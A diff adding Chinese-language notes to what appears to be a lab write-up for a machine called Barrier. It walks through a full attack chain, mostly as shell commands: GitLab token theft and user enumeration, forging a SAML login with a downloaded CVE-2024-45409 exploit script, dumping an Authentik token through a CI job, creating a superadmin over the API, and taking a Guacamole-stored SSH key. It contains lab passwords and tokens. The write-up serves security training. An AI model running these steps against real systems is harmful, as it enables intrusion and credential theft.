@@ -168,4 +168,152 @@ COPY 0
 ```
 </details>
 
-#### Kubernetes = K8s From Giveback
+#### 'Kubernetes = K8s' From Giveback
+
+#### GitLab From Barrier
+<details>
+<summary>GitLab API 枚举用户</summary>
+
+```
+GitLab API 枚举用户
+---------------------------------------------------------------------------
+//在gitconnect.py
+auth_data = {
+          'grant_type': 'password',
+          'username': 'satoru',
+          'password': 'dGJ2V72SUEMsM3Ca'
+    }
+//手动获得access token
+//获取token_type:"Bearer"
+[★]$ curl -sk https://gitlab.barrier.vl/oauth/token -d "grant_type=password&username=satoru&password=dGJ2V72SUEMsM3Ca"
+//用作Bearer列出用户的令牌
+[★]$ curl -sk --header "Authorization: Bearer glpat-***********" "https://gitlab.barrier.vl/api/v4/users?per_page=100" | jq .
+---------------------------------------------------------------------------
+```
+</details>
+
+<details>
+<summary>拦截GET cookie</summary>
+
+```
+拦截GET cookie：点击了'Gitlab',本地网络，点击‘Advanced...','Accept the Risk and Continue'
+---------------------------------------------------------------------------
+GET /users/auth/saml/callback?SAMLResponse=URL
+解码：CyberChef：URL Decode 去掉%xx | From Base64	还原二进制 | Raw Inflate	解压（zlib/deflate）
+CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!
+
+[★]$ vi saml.xml
+[★]$ wget https://raw.githubusercontent.com/synacktiv/CVE-2024-45409/refs/heads/main/CVE-2024-45409.py
+[★]$ pip3 install lxml
+[★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
+[★]$ cat response_patched.xml
+
+编码:CyberChef: Raw Deflate	压缩 | To Base64	编码 | URL Encode 变成 HTTP 可传输
+CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars"
+---------------------------------------------------------------------------
+只Send，不要forward(HTTP History 存在的意义)，将2个cookie粘贴到'Accept the Risk and Continue'后面新的页面
+另外：%3D%3D 要变成 ==（URL解码）
+```
+</details>
+
+<details>
+<summary>CI/CD：得到AUTHENTIK_TOKEN，即Authentik 令牌</summary>
+	
+```
+CI/CD：得到AUTHENTIK_TOKEN，即Authentik 令牌
+---------------------------------------------------------------------------
+在akdamin的下面‘admin' -> 'CI/CD' -> 'Runners' -> '#1 (sT3k7uGUy)':	Tags: auto_5e7f
+[1]查看'Runners'部分，#1 (sT3k7uGUy) 点击“Resume”来激活运行器
+[2]将创建一个新项目:	'Overview' -> 'projects' -> 'New Project' -> 'Create blank project'：	输入Tags: auto_5e7f
+[3]new file :
+#.gitlab-ci.yml
+
+image:
+    name: redis:alpine
+    pull_policy: if-not-present
+
+stages:
+  - build 
+
+job_build:
+  stage: build
+  script:
+    - env
+  tags:
+    - auto_5e7f
+[4]将.gitlab-ci.yml文件：'Download'后‘Upload new file'
+[5]查看“Jobs”部分，那里应该已经有一个名为“job_build”的新任务，得到AUTHENTIK_TOKEN，即Authentik 令牌
+98 AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
+```
+</details>
+
+<details>
+<summary>认证中心Authentik 令牌 创建Superadmin用户</summary>
+	
+```
+认证中心Authentik 令牌
+---------------------------------------------------------------------------
+https://api.goauthentik.io/reference/core-users-list/
+---------------------------------------------------------------------------
+//查看用户
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
+//创建用户
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "username": "superadmin", "name": "superadmin"}' jq
+//设置密码
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "password": "Pa$$word123!"}'
+//加入用户组akadmin
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "pk": 36}'
+//再次查看用户组
+[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
+```
+</details>
+
+<details>
+<summary>-oHostKeyAlgorithms=+ssh-rsa 强制 SSH 客户端“允许使用 ssh-rsa 这种旧算法”，现在使用的是使用的是 SHA-1</summary>
+	
+```
+登录 Authentik：https://barrier.vl:9443
+---------------------------------------------------------------------------
+在仪表板的右上角，点击“Admin interface” -> Directory -> Users -> 点击 maki的‘Impersonate' -> 点击 ‘Guacamole',找到终端‘>_ Maintenance'
+
+maki@barrier:/etc/guacamole$ cat guacamole.properties
+# MySQL properties
+mysql-hostname: 127.0.0.1
+mysql-port: 3306
+mysql-database: guac_db
+mysql-username: guac_user
+mysql-password: guac2024
+<SNIP>
+
+maki@barrier:/etc/guacamole$ mysql -u guac_user -p guac2024 guac_db
+MariaDB [guac_db]>
+
+MariaDB [guac_db]> show tables;
+| guacamole_sharing_profile_permission  |
+
+MariaDB [guac_db]> select * from guacamole_connection_parameter;
+| connection_id | parameter_name | parameter_value
+|             1 | port           | 22
+|             2 | passphrase     | 3V32FN6oViMPxyzC 		<--- 神奇的是这个密码和 RSA一起使用
+|             2 | port           | 22
+|             2 | private-key    | -----BEGIN RSA PRIVATE KEY-----
+<SNIP>
+-----END RSA PRIVATE KEY-----
+|             2 | username       | maki_adm
+
+
+[★]$ chmod 600 maki_adm
+
+[★]$ ssh -i maki_adm maki_adm@barrier.vl -oHostKeyAlgorithms=+ssh-rsa 		
+The authenticity of host 'barrier.vl (10.129.234.46)' can't be established.
+RSA key fingerprint is SHA256:GCkGAQTxizCkIcpuBSCr79rJ/Al5wn745cwFDs+dY4A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'barrier.vl' (RSA) to the list of known hosts.
+Enter passphrase for key 'maki_adm': 3V32FN6oViMPxyzC 
+<SNIP>
+maki_adm@barrier:~$
+```
+</details>
+
+```
